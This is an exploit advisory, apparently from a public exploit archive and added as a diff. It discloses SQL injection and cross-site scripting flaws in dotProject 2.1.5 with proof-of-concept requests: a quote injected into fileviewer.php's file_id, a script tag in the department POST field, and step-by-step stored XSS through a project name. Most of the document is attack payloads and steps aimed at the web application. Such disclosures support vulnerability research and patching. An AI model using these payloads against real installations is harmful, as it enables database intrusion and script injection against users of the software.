@@ -1,0 +1,35 @@
+# exploit title: sql injection in dotproject 2.1.5
+# date 21.o2.2o11
+# author: lemlajt
+# software : dotproject
+# version: 2.1.5
+# tested on: linux
+# cve :
+# http://dotproject.net/
+
+
+PoC :
+http://localhost/www/cmsadmins/dotpro/dotproject/fileviewer.php?file_id='
+
+in src:
+2 ./dotproject/fileviewer.php:
+127 db_loadHash('SELECT * FROM (`dotp_files`) WHERE file_id = -9',NULL)
+
+another xss/sqli is here:
+POST http://localhost/www/cmsadmins/dotpro/dotproject/index.php?m=projects
+$department=company_1"><script>alert(1)</script>
+
+we get an error with sql infos and xss.
+
+1. visit
+http://localhost/www/cmsadmins/dotpro/dotproject/index.php?m=projects&a=addedit
+(adding new project)
+2. POST $project_name="><script>
+persistant.here</script> and choose 'company' to submit the form.
+3. to see some affects just visit new project page: (in this example)
+http://localhost/www/cmsadmins/dotpro/dotproject/index.php?m=projects&a=view&project_id=2
+
+# *
+regards!
+
+o/
